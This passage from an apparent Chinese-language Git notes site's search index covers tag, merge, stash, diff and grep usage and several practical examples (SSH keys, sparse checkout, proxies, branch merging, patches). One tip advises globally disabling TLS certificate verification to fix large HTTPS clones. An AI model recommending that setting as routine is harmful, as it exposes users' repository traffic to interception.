-s \u6216 -u <keyid> \u4f7f\u7528\u65f6\u521b\u5efa\u3002\u4e0d\u4f7f\u7528 -u <keyid> \u65f6\uff0c\u5f53\u524d\u7528\u6237\u7684\u63d0\u4ea4\u8005\u8eab\u4efd\u7528\u4e8e\u67e5\u627e GnuPG \u5bc6\u94a5\u8fdb\u884c\u7b7e\u540d\u3002\u914d\u7f6e\u53d8\u91cf gpg.program \u7528\u4e8e\u6307\u5b9a\u81ea\u5b9a\u4e49 GnuPG \u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u6807\u8bb0\u5bf9\u8c61\uff08\u7528 -a \u3001 -s \u6216 -u \u521b\u5efa\uff09\u79f0\u4e3a\u201c\u5e26\u6ce8\u91ca\u7684\u201d\u6807\u7b7e(annotated tag)\uff1b\u5b83\u4eec\u5305\u542b\u521b\u5efa\u65e5\u671f\u3001\u6807\u8bb0\u540d\u79f0\u548c\u7535\u5b50\u90ae\u4ef6\u3001\u6807\u8bb0\u6d88\u606f\u548c\u53ef\u9009\u7684 GnuPG \u7b7e\u540d\u3002\u800c\u201c\u8f7b\u91cf\u7ea7\u201d\u6807\u7b7e(lightweight tag)\u53ea\u662f\u5bf9\u8c61\uff08\u901a\u5e38\u662f\u63d0\u4ea4\u5bf9\u8c61\uff09\u7684\u7b80\u5355\u540d\u79f0\u3002 \u5e26\u6ce8\u91ca\u7684\u6807\u7b7e\u7528\u4e8e\u53d1\u5e03\uff0c\u800c\u8f7b\u91cf\u7ea7\u6807\u7b7e\u7528\u4e8e\u79c1\u6709\u6216\u4e34\u65f6\u5bf9\u8c61\u6807\u7b7e\u3002\u51fa\u4e8e\u8fd9\u4e2a\u539f\u56e0\uff0c\u4e00\u4e9b\u7528\u4e8e\u547d\u540d\u5bf9\u8c61\u7684 git \u547d\u4ee4\uff08\u5982 git describe \uff09\u9ed8\u8ba4\u4f1a\u5ffd\u7565\u8f7b\u91cf\u7ea7\u6807\u7b7e\u3002 \u5728\u6211\u4eec\u4f7f\u7528 git push \u547d\u4ee4\u63a8\u9001\u67d0\u4e2a\u5206\u652f\u7684\u65f6\u5019\uff0c\u6807\u7b7e\u5e76\u4e0d\u4f1a\u88ab\u63a8\u9001\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u6240\u4ee5 \u6211\u4eec\u5fc5\u987b\u663e\u5f0f\u7684\u63a8\u9001\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93 \u3002 \u4f7f\u7528\u4e0b\u9762\u4e24\u79cd\u547d\u4ee4\u5219\u53ef\u4ee5\u63a8\u9001\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff1a git push <remote> <tag_name> \uff1a\u63a8\u9001\u67d0\u4e2a\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\u3002 git push <remote> --tags \uff1a\u63a8\u9001\u6240\u6709\u6807\u7b7e\u5230\u8fdc\u7a0b\u4ed3\u5e93\u3002 \u540c\u6837\uff0c\u5728\u5220\u9664\u672c\u5730\u7684\u6807\u7b7e\u540e\uff0c\u8981\u60f3\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6807\u7b7e\uff0c\u4e5f\u5fc5\u987b\u4f7f\u7528\u7684\u663e\u5f0f\u7684\u547d\u4ee4\uff1a git push <remote> --delete <tag_name> \uff1a\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u7684\u67d0\u4e2a\u6807\u7b7e\u3002 git push <remote> :refs/tags/<tagname> \uff1a\u5220\u9664\u8fdc\u7a0b\u4ed3\u5e93\u67d0\u4e2a\u6807\u7b7e\u7684\u7b49\u4ef7\u65b9\u5f0f\uff0c\u76f8\u5f53\u4e8e\u5c06\u5192\u53f7\u524d\u9762\u7684\u7a7a\u503c\u63a8\u9001\u5230\u8fdc\u7a0b\u6807\u7b7e\u540d\uff0c\u4ece\u800c\u9ad8\u6548\u5730\u5220\u9664\u5b83\u3002 \u53c2\u8003: https://git-scm.com/docs/git-tag","title":"\u6807\u7b7e"},{"location":"git/git/#merge","text":"git-merge - \u5c06\u4e24\u4e2a\u6216\u591a\u4e2a\u5f00\u53d1\u5386\u53f2\u8fde\u63a5\u5728\u4e00\u8d77 git merge [-n] [--stat] [--no-commit] [--squash] [--[no-]edit] [--no-verify] [-s <strategy>] [-X < strategy-option>] [-S[<keyid>]] [--[no-]allow-unrelated-histories] [--[no-]rerere-autoupdate] [-m <msg>] [-F <file >] [--into-name <branch>] [<commit>...\u200b] git merge (--continue | --abort | --quit) \u5728\u5e94\u7528\u5916\u90e8\u66f4\u6539\u4e4b\u524d\uff0c\u60a8\u5e94\u8be5\u8ba9\u81ea\u5df1\u7684\u5de5\u4f5c\u4fdd\u6301\u826f\u597d\u72b6\u6001\u5e76\u5728\u672c\u5730\u63d0\u4ea4\uff0c\u8fd9\u6837\u5982\u679c\u53d1\u751f\u51b2\u7a81\u5c31\u4e0d\u4f1a\u88ab\u7834\u574f\u3002\u53e6\u89c1 git-stash \u3002 \u5f53\u672c\u5730\u672a\u63d0\u4ea4\u7684\u66f4\u6539\u4e0e git pull / git merge \u53ef\u80fd\u9700\u8981\u66f4\u65b0\u7684\u6587\u4ef6\u91cd\u53e0\u65f6\uff0c git pull \u548c git merge \u5c06\u505c\u6b62\u800c\u4e0d\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 \u770b\u5230\u51b2\u7a81\u540e\uff0c\u60a8\u53ef\u4ee5\u505a\u4e24\u4ef6\u4e8b\uff1a \u51b3\u5b9a\u4e0d\u5408\u5e76\u3002\u60a8\u9700\u8981\u7684\u552f\u4e00\u6e05\u7406\u662f\u5c06\u7d22\u5f15\u6587\u4ef6\u91cd\u7f6e\u4e3a HEAD \u7684\u53cd\u5411\u63d0\u4ea4\uff0c \u5e76\u6e05\u7406\u6240\u505a\u7684\u5de5\u4f5c\u6811\u66f4\u6539\uff1b git merge --abort \u53ef\u7528\u4e8e\u6b64\u3002 \u89e3\u51b3\u51b2\u7a81\u3002Git \u5c06\u6807\u8bb0\u5de5\u4f5c\u6811\u4e2d\u7684\u51b2\u7a81\u3002\u5c06\u6587\u4ef6\u7f16\u8f91\u6210\u5f62\u72b6 \u5e76\u5c06\u5b83\u4eec\u6dfb\u52a0\u5230\u7d22\u5f15\u4e2d\u3002\u4f7f\u7528 git commit \u6216 git merge --continue \u6765\u5b8c\u6210\u4ea4\u6613\u3002\u540e\u4e00\u4e2a\u547d\u4ee4\u5728\u8c03\u7528 git commit \u4e4b\u524d\u68c0\u67e5\u662f\u5426\u6b63\u5728\u8fdb\u884c\uff08\u4e2d\u65ad\u7684\uff09\u5408\u5e76\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u5de5\u5177\u89e3\u51b3\u51b2\u7a81\uff1a \u4f7f\u7528\u5408\u5e76\u5de5\u5177\u3002 git mergetool \u542f\u52a8\u56fe\u5f62\u5408\u5e76\u5de5\u5177\uff0c\u5b83\u5c06\u5e2e\u52a9\u60a8\u5b8c\u6210\u5408\u5e76\u3002 \u770b\u770b\u5dee\u5f02\u3002 git diff \u5c06\u663e\u793a\u4e09\u5411\u5dee\u5f02\uff0c\u7a81\u51fa\u663e\u793a HEAD \u548c MERGE_HEAD \u7248\u672c\u7684\u66f4\u6539\u3002 \u67e5\u770b\u6bcf\u4e2a\u5206\u652f\u7684\u5dee\u5f02\u3002 git log --merge -p <path> \u5c06\u9996\u5148\u663e\u793a HEAD \u7248\u672c\u7684\u5dee\u5f02\uff0c\u7136\u540e\u663e\u793a MERGE_HEAD \u7248\u672c\u3002 \u770b\u770b\u539f\u4ef6\u3002 git show :1:filename \u663e\u793a\u5171\u540c\u7956\u5148\uff0c git show :2:filename \u663e\u793a HEAD \u7248\u672c\uff0c git show :3:filename \u663e\u793a MERGE_HEAD \u7248\u672c\u3002 \u53c2\u8003: https://git-scm.com/docs/git-merge","title":"\u5408\u5e76"},{"location":"git/git/#stash","text":"git-stash - \u5c06\u66f4\u6539\u5b58\u50a8\u5728\u810f\u5de5\u4f5c\u76ee\u5f55\u4e2d git stash list [<log-options>] git stash show [-u|--include-untracked|--only-untracked] [<diff-options>] [<stash>] git stash drop [-q|--quiet] [<stash>] git stash ( pop | apply ) [--index] [-q|--quiet] [<stash>] git stash branch <branchname> [<stash>] git stash [push [-p|--patch] [-S|--staged] [-k|--[no-]keep-index] [-q|--quiet] [-u|--include-untracked] [-a|--all] [-m|--message <message>] [--pathspec-from-file=<file> [--pathspec-file-nul]] [--] [<pathspec>\u2026\u200b]] git stash clear git stash create [<message>] git stash store [-m|--message <message>] [-q|--quiet] <commit> \u5f53\u60a8\u60f3\u8bb0\u5f55\u5de5\u4f5c\u76ee\u5f55\u548c\u7d22\u5f15\u7684\u5f53\u524d\u72b6\u6001\uff0c\u4f46\u53c8\u60f3\u56de\u5230\u5e72\u51c0\u7684\u5de5\u4f5c\u76ee\u5f55\u65f6\u4f7f\u7528 git stash \u3002\u8be5\u547d\u4ee4\u4fdd\u5b58\u60a8\u7684\u672c\u5730\u4fee\u6539\u5e76\u6062\u590d\u5de5\u4f5c\u76ee\u5f55\u4ee5\u5339\u914d HEAD \u63d0\u4ea4\u3002 \u8be5\u547d\u4ee4\u9690\u85cf\u7684\u4fee\u6539\u53ef\u4ee5\u7528 git stash list \u5217\u51fa \u3001 git stash show \u68c0\u67e5\u548c git stash apply \u6062\u590d\uff08\u53ef\u80fd\u5728\u4e0d\u540c\u7684\u63d0\u4ea4\u4e4b\u4e0a\uff09\u3002 git stash \u4e0d\u5e26\u4efb\u4f55\u53c2\u6570\u7684\u8c03\u7528\u7b49\u6548\u4e8e git stash push . \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b58\u50a8\u88ab\u5217\u4e3a\u201cWIP on branchname ...\u200b\u201d\uff0c\u4f46\u60a8\u53ef\u4ee5\u5728\u521b\u5efa\u65f6\u5728\u547d\u4ee4\u884c\u4e0a\u63d0\u4f9b\u66f4\u5177\u63cf\u8ff0\u6027\u7684\u6d88\u606f\u3002 \u60a8\u521b\u5efa\u7684\u6700\u65b0\u5b58\u50a8\u5b58\u50a8\u5728 refs/stash ; \u8f83\u65e7\u7684\u5b58\u50a8\u53ef\u5728\u6b64\u53c2\u8003\u7684 reflog \u4e2d\u627e\u5230\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f7f\u7528\u901a\u5e38\u7684 reflog \u8bed\u6cd5\u547d\u540d\uff08\u4f8b\u5982 stash@{0} \uff0c\u662f\u6700\u8fd1\u521b\u5efa\u7684\u5b58\u50a8\uff0c stash@{1} \u662f\u5b83\u4e4b\u524d\u7684\u5b58\u50a8\uff0c stash@{2.hours.ago} \u4e5f\u662f\u53ef\u80fd\u7684\uff09\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ec5\u6307\u5b9a\u5b58\u50a8\u7d22\u5f15\u6765\u5f15\u7528\u5b58\u50a8\uff08\u4f8b\u5982\uff0c\u6574\u6570 n \u7b49\u4ef7\u4e8e stash@{n} \uff09\u3002 push [-m | --message ] [--] [ \u2026\u200b ] : \u5c06\u672c\u5730\u4fee\u6539\u4fdd\u5b58\u5230\u65b0\u7684\u5b58\u50a8\u6761\u76ee\u5e76\u5c06\u5b83\u4eec\u56de\u6eda\u5230 HEAD\uff08\u5728\u5de5\u4f5c\u6811\u548c\u7d22\u5f15\u4e2d\uff09\u3002 <message> \u90e8\u5206\u662f\u53ef\u9009\u7684\uff0c\u5b83\u63d0\u4f9b\u63cf\u8ff0\u4ee5\u53ca\u9690\u85cf\u72b6\u6001\u3002 save : \u6b64\u9009\u9879\u5df2\u5f03\u7528\uff0c\u53d6\u800c\u4ee3\u4e4b\u7684\u662f git stash push \u3002\u5b83\u4e0e\u201cstash push\u201d\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5b83\u4e0d\u80fd\u91c7\u7528 pathspec\u3002\u76f8\u53cd\uff0c\u6240\u6709\u975e\u9009\u9879\u53c2\u6570\u90fd\u8fde\u63a5\u8d77\u6765\u5f62\u6210\u5b58\u50a8\u6d88\u606f\u3002 list [ ] : \u5217\u51fa\u60a8\u5f53\u524d\u62e5\u6709\u7684\u5b58\u50a8\u6761\u76ee\u3002\u6bcf\u4e2a\u5b58\u50a8\u6761\u76ee\u90fd\u5217\u51fa\u4e86\u5b83\u7684\u540d\u79f0\uff08\u4f8b\u5982stash@{0}\uff0c\u662f\u6700\u65b0\u7684\u6761\u76ee\uff0cstash@{1}\u662f\u4e4b\u524d\u7684\u6761\u76ee\uff0c\u7b49\u7b49\uff09\uff0c\u521b\u5efa\u6761\u76ee\u65f6\u5f53\u524d\u5206\u652f\u7684\u540d\u79f0\uff0c\u4ee5\u53ca\u8be5\u6761\u76ee\u6240\u57fa\u4e8e\u7684\u63d0\u4ea4\u7684\u7b80\u77ed\u63cf\u8ff0. stash@{0}: WIP on submit: 6ebd0e2... Update git-stash documentation stash@{1}: On master: 9cc0589... Add git-stash show [-u|--include-untracked|--only-untracked] [ ] [ ] : \u5c06\u5b58\u50a8\u6761\u76ee\u4e2d\u8bb0\u5f55\u7684\u66f4\u6539\u663e\u793a\u4e3a\u5b58\u50a8\u5185\u5bb9\u4e0e\u9996\u6b21\u521b\u5efa\u5b58\u50a8\u6761\u76ee\u65f6\u8fd4\u56de\u7684\u63d0\u4ea4\u4e4b\u95f4\u7684\u5dee\u5f02\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8be5\u547d\u4ee4\u663e\u793a diffstat\uff0c\u4f46\u5b83\u4f1a\u63a5\u53d7 git diff \u5df2\u77e5\u7684\u4efb\u4f55\u683c\u5f0f\uff08\u4f8b\u5982\uff0c git stash show -p stash@{1} \u4ee5\u8865\u4e01\u5f62\u5f0f\u67e5\u770b\u7b2c\u4e8c\u4e2a\u6700\u8fd1\u7684\u6761\u76ee\uff09\u3002\u5982\u679c\u6ca1\u6709 <diff-option> \u63d0\u4f9b\uff0c\u9ed8\u8ba4\u884c\u4e3a\u5c06\u7531config \u53d8\u91cf stash.showStat \u548c stash.showPatch \u7ed9\u51fa\u3002\u60a8\u4e5f\u53ef\u4ee5\u4f7f\u7528 stash.showIncludeUntracked \u8bbe\u7f6e --include-untracked \u9009\u9879\u662f\u5426\u9ed8\u8ba4\u542f\u7528\u3002 pop [--index] [-q|--quiet] [ ] : \u4ece\u5b58\u50a8\u5217\u8868\u4e2d\u5220\u9664\u5355\u4e2a\u9690\u85cf\u72b6\u6001\u5e76\u5c06\u5176\u5e94\u7528\u4e8e\u5f53\u524d\u5de5\u4f5c\u6811\u72b6\u6001\u7684\u9876\u90e8\uff0c\u5373\u6267\u884c git stash push \u7684\u9006\u64cd\u4f5c\u3002\u5de5\u4f5c\u76ee\u5f55\u5fc5\u987b\u4e0e\u7d22\u5f15\u5339\u914d\u3002\u5e94\u7528\u72b6\u6001\u53ef\u80fd\u4f1a\u56e0\u51b2\u7a81\u800c\u5931\u8d25\uff1b\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4e0d\u4f1a\u4ece\u5b58\u50a8\u5217\u8868\u4e2d\u5220\u9664\u3002\u60a8\u9700\u8981\u624b\u52a8\u89e3\u51b3\u51b2\u7a81\uff0c\u7136\u540e\u624b\u52a8\u8c03\u7528 git stash drop \u3002 apply [--index] [-q|--quiet] [ ] : \u7c7b\u4f3cpop\uff0c\u4f46\u4e0d\u4f1a\u4ecestash\u5b58\u50a8\u5217\u8868\u4e2d\u5220\u9664\u72b6\u6001\u3002\u4e0d\u540c\u4e8epop, \u53ef\u80fd\u662f\u4efb\u4f55\u770b\u8d77\u6765\u50cf\u7531 stash push \u6216 stash create \u521b\u5efa\u7684\u63d0\u4ea4\u3002 branch [ ] : \u521b\u5efa\u5e76\u7b7e\u51fa\u4e00\u4e2a\u4ece <stash> \u6700\u521d\u521b\u5efa\u7684\u63d0\u4ea4\u5f00\u59cb\u547d\u540d\u7684\u65b0\u5206\u652f <branchname> \uff0c\u5c06 <stash> \u8bb0\u5f55\u7684\u66f4\u6539\u5e94\u7528\u5230\u65b0\u7684\u5de5\u4f5c\u6811\u548c\u7d22\u5f15\u3002\u5982\u679c\u6210\u529f\uff0c\u5e76\u4e14 <stash> \u662f\u8868\u5355\u7684\u5f15\u7528 stash@{<revision>} \uff0c\u5219\u5220\u9664 <stash> \u3002\u5982\u679c\u60a8\u8fd0\u884c git stash push \u7684\u5206\u652f\u53d1\u751f\u4e86\u8db3\u591f\u591a\u7684\u66f4\u6539\u800c\u5bfc\u81f4 git stash apply \u7531\u4e8e\u51b2\u7a81\u800c\u5931\u8d25\uff0c\u8fd9\u5c06\u5f88\u6709\u7528\u3002\u7531\u4e8e\u5b58\u50a8\u6761\u76ee\u5e94\u7528\u5728\u8fd0\u884c git stash \u65f6\u4e3a HEAD \u7684\u63d0\u4ea4\u4e4b\u4e0a\uff0c\u56e0\u6b64\u5b83\u6062\u590d\u4e86\u6700\u521d\u7684stash\u72b6\u6001\u800c\u6ca1\u6709\u51b2\u7a81\u3002 clear : \u5220\u9664\u6240\u6709stash\u6761\u76ee\u3002\u8bf7\u6ce8\u610f\uff0c\u8fd9\u4e9b\u6761\u76ee\u968f\u540e\u5c06\u53d7\u5230\u4fee\u526a\uff0c\u5e76\u4e14\u53ef\u80fd\u65e0\u6cd5\u6062\u590d\u3002 drop [-q|--quiet] [ ] : \u4ecestash\u5217\u8868\u4e2d\u5220\u9664\u5355\u4e2astash\u3002 create : \u521b\u5efa\u4e00\u4e2astash\uff08\u8fd9\u662f\u4e00\u4e2a\u5e38\u89c4\u63d0\u4ea4\u5bf9\u8c61\uff09\u5e76\u8fd4\u56de\u5176\u5bf9\u8c61\u540d\u79f0\uff0c\u800c\u4e0d\u5c06\u5176\u5b58\u50a8\u5728 ref \u547d\u540d\u7a7a\u95f4\u4e2d\u7684\u4efb\u4f55\u4f4d\u7f6e\u3002\u8fd9\u65e8\u5728\u5bf9\u811a\u672c\u6709\u7528\u3002\u5b83\u53ef\u80fd\u4e0d\u662f\u60a8\u8981\u4f7f\u7528\u7684\u547d\u4ee4\uff1b\u53c2\u89c1\u4e0a\u9762\u7684\u201cpush\u201d\u3002 store : \u5c06\u901a\u8fc7 git stash create \u521b\u5efa\u7684\u7ed9\u5b9a\u5b58\u50a8\uff08\u8fd9\u662f\u4e00\u4e2a\u60ac\u7a7a\u5408\u5e76\u63d0\u4ea4\uff09\u5b58\u50a8\u5728\u5b58\u50a8\u5f15\u7528\u4e2d\uff0c\u66f4\u65b0\u5b58\u50a8\u5f15\u7528\u65e5\u5fd7\u3002\u8fd9\u65e8\u5728\u5bf9\u811a\u672c\u6709\u7528\u3002\u5b83\u53ef\u80fd\u4e0d\u662f\u60a8\u8981\u4f7f\u7528\u7684\u547d\u4ee4\uff1b\u53c2\u89c1\u4e0a\u9762\u7684\u201cpush\u201d\u3002 \u53c2\u8003: https://git-scm.com/docs/git-stash","title":"\u6682\u5b58stash"},{"location":"git/git/#diff","text":"git-diff - \u663e\u793a\u63d0\u4ea4\u3001\u63d0\u4ea4\u548c\u5de5\u4f5c\u6811\u7b49\u4e4b\u95f4\u7684\u66f4\u6539 git diff [<options>] [<commit>] [--] [<path>\u2026\u200b] git diff [<options>] --cached [--merge-base] [<commit>] [--] [<path>\u2026\u200b] git diff [<options>] [--merge-base] <commit> [<commit>\u2026\u200b] <commit> [--] [<path>\u2026\u200b] git diff [<options>] <commit>\u2026\u200b<commit> [--] [<path>\u2026\u200b] git diff [<options>] <blob> <blob> git diff [<options>] --no-index [--] <path> <path> \u53c2\u8003: https://git-scm.com/docs/git-diff","title":"\u6bd4\u8f83diff"},{"location":"git/git/#grep","text":"git-grep - \u8f93\u51fa\u4e0e\u67e5\u627e\u6a21\u5f0f\u5339\u914d\u7684\u884c git grep [-a | --text] [-I] [--textconv] [-i | --ignore-case] [-w | --word-regexp] [-v | --invert-match] [-h|-H] [--full-name] [-E | --extended-regexp] [-G | --basic-regexp] [-P | --perl-regexp] [-F | --fixed-strings] [-n | --line-number] [--column] [-l | --files-with-matches] [-L | --files-without-match] [(-O | --open-files-in-pager) [<pager>]] [-z | --null] [ -o | --only-matching ] [-c | --count] [--all-match] [-q | --quiet] [--max-depth <depth>] [--[no-]recursive] [--color[=<when>] | --no-color] [--break] [--heading] [-p | --show-function] [-A <post-context>] [-B <pre-context>] [-C <context>] [-W | --function-context] [--threads <num>] [-f <file>] [-e] <pattern> [--and|--or|--not|(|)|-e <pattern>\u2026\u200b] [--recurse-submodules] [--parent-basename <basename>] [ [--[no-]exclude-standard] [--cached | --no-index | --untracked] | <tree>\u2026\u200b] [--] [<pathspec>\u2026\u200b] \u53c2\u8003: https://git-scm.com/docs/git-grep","title":"\u67e5\u627egrep"},{"location":"git/git/#examples","text":"\u4e0b\u9762\u662f\u672c\u4eba\u5b9e\u9645\u9047\u5230\u7684\u4e00\u4e9b\u793a\u4f8b:","title":"\u793a\u4f8b"},{"location":"git/git/#build-server","text":"\u672c\u5730\u81ea\u5efagit\u670d\u52a1\u5668 jerry@jerry:~$ git init --bare demo.git hint: Using 'master' as the name for the initial branch. This default branch name hint: is subject to change. To configure the initial branch name to use in all hint: of your new repositories, which will suppress this warning, call: hint: hint: git config --global init.defaultBranch <name> hint: hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and hint: 'development'. The just-created branch can be renamed via this command: hint: hint: git branch -m <name> Initialized empty Git repository in /home/jerry/demo.git/ # \u5728\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u5939\u4e0b\u514b\u9686\u6b64\u4ed3\u5e93 jerry@jerry:~/Code$ git clone jerry@127.0.0.1:/home/jerry/demo.git Cloning into 'demo'... jerry@127.0.0.1's password: warning: You appear to have cloned an empty repository. clone\u683c\u5f0f: $ git clone ssh://gituser@www.xx.com:27852/xx/git/xx/sample.git \u5176\u4e2d gituser\uff1a\u8868\u793a\u7528\u6237 www.xx.com\uff1a\u8868\u793a\u670d\u52a1ip\u5730\u5740 27852\u8868\u793a\u7aef\u53e3 /xx/git/xx/sample.git:\u8868\u793a\u4ee3\u7801\u4ed3\u5e93\u8def\u5f84","title":"\u670d\u52a1\u5668\u642d\u5efa"},{"location":"git/git/#ssh-key","text":"\u751f\u6210RSA\u5bc6\u94a5: $ ssh-keygen -t rsa -C \"1364812552@qq.com\" -t \u8868\u793a\u5bc6\u94a5\u7684\u7c7b\u578b \uff0c-b\u8868\u793a\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c-C \u7528\u4e8e\u8bc6\u522b\u8fd9\u4e2a\u5bc6\u94a5\u7684\u6ce8\u91ca\u3002 linux\u9ed8\u8ba4\u751f\u6210\u76ee\u5f55\u662f ~/.ssh/ \uff0cWindows\u662f C:\\Users\\Administrator\\.ssh\\ \u590d\u5236\u516c\u94a5 id_rsa.pub \u7684\u5185\u5bb9\uff0c\u5728Github -> Settings -> SSH and GPG keys -> New SSH key \u4e2d\u6dfb\u52a0\u516c\u94a5\u3002 \u4f7f\u7528 ssh -T git@github.com \u9a8c\u8bc1\u662f\u5426\u6210\u529f\u3002","title":"ssh\u514d\u5bc6"},{"location":"git/git/#sparse-checkout","text":"\u4ee5https://github.com/geekhac/to...\u5b50\u76ee\u5f55\u4e3a\u4f8b\uff1a $ git init todomvc && cd todomvc $ git config core.sparsecheckout true //\u8bbe\u7f6e\u5141\u8bb8\u514b\u9686\u5b50\u76ee\u5f55 $ echo '/examples/react/*' >> .git/info/sparse-checkout //\u8bbe\u7f6e\u8981\u514b\u9686\u7684\u4ed3\u5e93\u7684\u5b50\u76ee\u5f55\u8def\u5f84 $ git remote add origin https://github.com/geekhac/to... $ git pull origin master /examples/react/* \u8def\u5f84\u53ef\u80fd\u9700\u8981\u76f8\u5bf9\u8def\u5f84\uff0c\u7ecf\u672c\u4eba\u6d4b\u8bd5\uff0c\u662f\u5426\u4ee5'/'\u5f00\u5934\u4e0d\u5f71\u54cd\u64cd\u4f5c\u7ed3\u679c\u3002","title":"\u53ea\u514b\u9686\u5355\u4e2a\u6587\u4ef6\u5939"},{"location":"git/git/#proxy","text":"# \u8bbe\u7f6ess $ git config --global http.proxy 'socks5://127.0.0.1:1080' $ git config --global https.proxy 'socks5://127.0.0.1:1080' # \u8bbe\u7f6e\u4ee3\u7406 $ git config --global http.proxy http://127.0.0.1:1080 $ git config --global https.proxy https://127.0.0.1:1080 # \u53d6\u6d88\u4ee3\u7406 $ git config --global --unset http.proxy $ git config --global --unset https.proxy","title":"\u4ee3\u7406\u8bbe\u7f6e"},{"location":"git/git/#http-buffer","text":"\u5f53\u4ed3\u5e93\u8d85\u8fc71G\u65f6\uff0cHTTPS Clone\u548c\u4e0b\u8f7dZIP\u6587\u4ef6\u53ef\u80fd\u4f1a\u5931\u8d25\uff0c\u4f7f\u7528SSH Clone\u66f4\u597d\u3002 \u6216\u8005\u5728\u589e\u5927postBuffer\u7684\u540c\u65f6\uff0c\u5173\u95edssl\u8ba4\u8bc1\uff1a $ git config --global http.postBuffer 2048000000 # \u8bbe\u7f6e\u4e3a2G $ git config --global http.sslVerify false # \u5173\u95edsslVerify $ git config --global core.compression 0 # or -1","title":"http\u7f13\u51b2\u533a"},{"location":"git/git/#long-path","text":"git\u6709\u53ef\u4ee5\u521b\u5efa4096\u957f\u5ea6\u7684\u6587\u4ef6\u540d\uff0c\u7136\u800c\u5728windows\u6700\u591a\u662f260\uff0c\u56e0\u4e3agit\u7528\u4e86\u65e7\u7248\u672c\u7684windows api\uff0c\u4e3a\u6b64\u8e29\u4e86\u4e2a\u5751\u3002 $ git checkout -f HEAD fatal: cannot create directory at 'src/third_party/node/linux/node-linux-x64/lib/node_modules/npm/node_modules/libnpx/node_modules/yargs/node_modules/read-pkg-up/node_modules/read-pkg/node_modules/load-json-file/node_modules/parse-json/node_modules/error-ex/node_modules': Filename too long $ git config --global core.longpaths true","title":"\u542f\u7528\u957f\u8def\u7ecf"},{"location":"git/git/#merge-example","text":"git merge\u6700\u7b80\u6d01\u7528\u6cd5 \u5f00\u53d1\u5206\u652f\uff08dev\uff09\u4e0a\u7684\u4ee3\u7801\u8fbe\u5230\u4e0a\u7ebf\u7684\u6807\u51c6\u540e\uff0c\u8981\u5408\u5e76\u5230 master \u5206\u652f $ git checkout dev $ git pull $ git checkout master $ git merge dev $ git push -u origin master \u5f53master\u4ee3\u7801\u6539\u52a8\u4e86\uff0c\u9700\u8981\u66f4\u65b0\u5f00\u53d1\u5206\u652f\uff08dev\uff09\u4e0a\u7684\u4ee3\u7801 $ git checkout master $ git pull $ git checkout dev $ git merge master $ git push -u origin dev","title":"\u5206\u652f\u5408\u5e76"},{"location":"git/git/#create-branch-base-other","text":"$ git checkout -b \u672c\u5730\u5206\u652f\u540d origin/\u8fdc\u7a0b\u5206\u652f\u540d $ git checkout -b develop origin/develop # \u5c06\u81ea\u5df1\u521b\u5efa\u7684\u672c\u5730\u5206\u652f\u63d0\u4ea4\u5230\u8fdc\u7a0b\u5206\u652f\uff0c\u81ea\u52a8\u5728\u8fdc\u7a0b\u5206\u652f\u4e0a\u521b\u5efa\u81ea\u5df1\u7684\u5206\u652f $ git push origin \u672c\u5730\u5206\u652f\u540d:\u8fdc\u7aef\u5206\u652f\u540dxx // \u5728\u670d\u52d9\u5668\u65b0\u5efa\u65b0\u5206\u652f\u540dxxx $ git push origin develop:develop","title":"\u5728\u67d0\u4e2a\u8fdc\u7a0b\u5206\u652f\u7684\u57fa\u7840\u4e0a\u521b\u5efa\u81ea\u5df1\u7684\u5206\u652f"},{"location":"git/git/#patch-diff","text":"\u53ea\u60f3\u5c06\u5f53\u524d\u6587\u4ef6\u5939\u4e2d\u6539\u52a8\u7684\u6587\u4ef6\u6253\u5305\u6210\u4e00\u4e2apatch\uff0c\u5e76\u4e0d\u60f3\u63d0\u4ea4\u76f8\u5e94\u7684\u4ee3\u7801 $ git diff > xxx.patch \u5f53\u518d\u6b21\u7528\u8fd9\u4e2apatch\u7684\u65f6\u5019\uff0c\u6267\u884c\u547d\u4ee4 $ git apply xxx.patch","title":"\u6253\u672c\u5730\u8865\u4e01"},{"location":"git/git/#show-commit","text":"# \u67e5\u770b\u6700\u65b0\u7684commit $ git show # \u67e5\u770b\u6307\u5b9acommit hashID\u7684\u6240\u6709\u4fee\u6539\uff1a $ git show commitId # \u67e5\u770b\u67d0\u6b21commit\u4e2d\u5177\u4f53\u67d0\u4e2a\u6587\u4ef6\u7684\u4fee\u6539\uff1a $ git show commitId fileName","title":"\u67e5\u770bcommit\u63d0\u4ea4\u8bb0\u5f55\u8be6\u60c5"},{"location":"git/git/#commit-amend","text":"\u5f53\u6211\u4eec\u63d0\u4ea4(commit)\u540e\uff0c\u8fd8\u672apush\u524d\uff0c\u53d1\u73b0\u6709\u4e9b\u6587\u4ef6\u5fd8\u4e86\u6682\u5b58\u4e86\uff0c\u8fd9\u4e9b\u6587\u4ef6\u81ea\u7136\u4e5f\u4e0d\u53ef\u80fd\u88ab\u4e0a\u4f20\u3002\u6b64\u65f6\u9700\u8981\u8865\u6551\u63aa\u65bd\uff1a\u5373\u5c06\u8fd9\u4e9b\u6587\u4ef6add\u4e0a\uff0c\u91cd\u65b0commit\u4e00\u4e0b\u3002 \u5047\u8bbe\u6587\u4ef6forget.text\u662f\u88ab\u9057\u5fd8\u7684\u6587\u4ef6: # \u7b2c\u4e00\u6b21\u63d0\u4ea4(\u5fd8\u4e86\u6587\u4ef6) $ git commit -m \"commit-first-time\" # \u5c06\u5fd8\u4e86\u7684\u6587\u4ef6\u7ee7\u7eedadd\u4e0a $ git add forget.txt # 